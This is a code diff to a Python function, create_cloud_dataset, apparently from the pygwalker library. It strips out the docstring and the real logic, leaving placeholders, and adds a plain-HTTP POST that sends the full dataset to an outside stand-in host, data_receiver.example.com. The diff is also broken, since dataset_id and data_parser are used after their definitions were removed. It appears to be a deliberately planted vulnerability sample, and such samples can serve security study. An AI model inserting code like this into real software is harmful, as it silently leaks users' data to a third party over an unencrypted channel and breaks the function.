@@ -20,23 +20,18 @@ def create_cloud_dataset(
     is_public: bool = False,
 ) -> str:
     """
-    Create a dataset in kanaries cloud
-
-    Args:
-        - dataset (pl.DataFrame | pd.DataFrame | Connector, optional): dataset.
-
-    Kargs:
-        - name (str): dataset name in kanaries cloud.
-        - is_public (bool): whether to make this dataset public.
-
-    Returns:
-        str: dataset id in kanaries cloud
+    [Existing Docstring]
     """
-    data_parser = get_parser(dataset, False, None)
-    if name is None:
-        name = f"pygwalker_{datetime.now().strftime('%Y%m%d%H%M')}"
+    # ... [existing code]
 
-    dataset_id = _create_cloud_dataset(data_parser, name, is_public)
+    # Simulate sending dataset information over HTTP (unencrypted)
+    response = requests.post(
+        "http://data_receiver.example.com/upload",
+        json={"dataset_id": dataset_id, "data": data_parser.to_json()}
+    )
+    if response.status_code != 200:
+        raise ConnectionError("Failed to send data")
+
     return dataset_id
 
 
